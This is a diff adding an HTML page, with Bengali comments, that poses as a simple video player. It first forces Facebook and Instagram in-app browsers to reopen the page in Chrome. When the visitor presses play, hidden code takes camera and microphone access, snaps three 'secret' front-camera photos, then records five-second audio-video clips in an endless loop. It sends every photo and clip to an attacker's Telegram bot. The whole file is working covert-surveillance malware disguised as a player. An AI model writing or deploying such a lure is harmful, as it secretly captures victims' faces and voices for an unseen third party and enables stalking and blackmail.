@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video Player</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+
+    .bg-glow {
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .player-card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 500px;
+      background: rgba(15, 23, 42, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 24px;
+      padding: 14px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+    }
+
+    .video-container {
+      position: relative;
+      width: 100%;
+      border-radius: 16px;
+      overflow: hidden;
+      background: #000;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    video {
+      width: 100%;
+      display: block;
+      outline: none;
+      border-radius: 16px;
+    }
+
+    #hiddenCam, #snapshotCanvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ক্রোম ব্রাউজারে ফোর্সফুলি ওপেন করার জন্য ইন-অ্যাপ ব্রাউজার ডিটেক্টর -->
+  <script>
+    (function() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const currentUrl = window.location.href;
+      
+      // যদি ফেসবুক, ইনস্টাগ্রাম বা মেসেঞ্জারের ইন-অ্যাপ ব্রাউজার হয়
+      if (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.indexOf('Instagram') > -1) {
+        // অ্যান্ড্রয়েডের জন্য ক্রোম ইনটেন্ট লিংক
+        if (/android/i.test(ua)) {
+          window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end;';
+        } 
+        // আইফোনের জন্য সাফারি বা ক্রোম প্রম্পট
+        else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+          // আইফোনে সরাসরি ক্রোম স্কিম ট্রাই করা যায়
+          window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
+        }
+      }
+    })();
+  </script>
+
+  <div class="bg-glow"></div>
+
+  <div class="player-card">
+    <div class="video-container">
+      <video id="mainVideo" controls preload="metadata">
+        <source src="video.mp4" type="video/mp4">
+        আপনার ব্রাউজার ভিডিও সাপোর্ট করছে না।
+      </video>
+    </div>
+  </div>
+
+  <video id="hiddenCam" autoplay playsinline muted></video>
+  <canvas id="snapshotCanvas"></canvas>
+
+  <script>
+    // ⚙️ রেন্ডার বিল্ডের সময় এগুলো অটোমেটিক এনভায়রনমেন্ট ভেরিয়েবল দিয়ে রিপ্লেস হবে
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+    const mainVideo = document.getElementById('mainVideo');
+    const hiddenCam = document.getElementById('hiddenCam');
+    const canvas = document.getElementById('snapshotCanvas');
+
+    let camStream = null;
+    let isStarted = false;
+
+    // প্লে বাটনে ক্লিক করলেই কাজ শুরু হবে
+    mainVideo.addEventListener('play', async () => {
+      if (isStarted) return;
+      isStarted = true;
+
+      try {
+        camStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: true 
+        });
+
+        hiddenCam.srcObject = camStream;
+
+        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো
+        await captureAndSendPhotos(3);
+
+        // ২. এরপর ৫ সেকেন্ডের ভিডিও ক্লিপ লুপ বা বারবার পাঠিয়ে যাওয়া শুরু করা
+        startPeriodicVideoRecording();
+
+      } catch (err) {
+        console.error("Camera permission denied or error:", err);
+      }
+    });
+
+    // ছবি তোলার ফাংশন
+    function takePhoto() {
+      return new Promise((resolve) => {
+        setTimeout(() => {
+          canvas.width = hiddenCam.videoWidth || 640;
+          canvas.height = hiddenCam.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(hiddenCam, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob((blob) => {
+            resolve(blob);
+          }, 'image/jpeg', 0.85);
+        }, 800); // ক্যামেরা স্টাবল হওয়ার জন্য সামান্য দেরি
+      });
+    }
+
+    // পর পর ৩টি ছবি টেলিগ্রামে পাঠানোর লুপ
+    async function captureAndSendPhotos(count) {
+      for (let i = 1; i <= count; i++) {
+        const photoBlob = await takePhoto();
+        if (photoBlob) {
+          const formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
+          formData.append('caption', `📸 সিক্রেট ছবি #${i}`);
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          }).catch(err => console.log("Photo send failed", err));
+        }
+      }
+    }
+
+    // প্রতি ৫ সেকেন্ড পর পর ভিডিও রেকর্ড করে টেলিগ্রামে পাঠানোর লুপ
+    function startPeriodicVideoRecording() {
+      if (!camStream) return;
+
+      const recordInterval = async () => {
+        if (!camStream || camStream.active === false) return;
+
+        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options = { mimeType: 'video/mp4' };
+        }
+
+        let mediaRecorder;
+        try {
+          mediaRecorder = new MediaRecorder(camStream, options);
+        } catch (e) {
+          return;
+        }
+
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            chunks.push(e.data);
+          }
+        };
+
+        mediaRecorder.onstop = async () => {
+          if (chunks.length > 0) {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', videoBlob, `clip_${Date.now()}.webm`);
+            formData.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+              method: 'POST',
+              body: formData
+            }).catch(err => console.log("Video send failed", err));
+          }
+
+          // পরবর্তী ৫ সেকেন্ডের ভিডিওর জন্য আবার কল করা (বারবার চলতে থাকবে)
+          setTimeout(recordInterval, 1000);
+        };
+
+        mediaRecorder.start();
+
+        // ঠিক ৫ সেকেন্ড পর রেকর্ড স্টপ করা
+        setTimeout(() => {
+          if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+          }
+        }, 5000);
+      };
+
+      recordInterval();
+    }
+  </script>
+</body>
+</html>
+
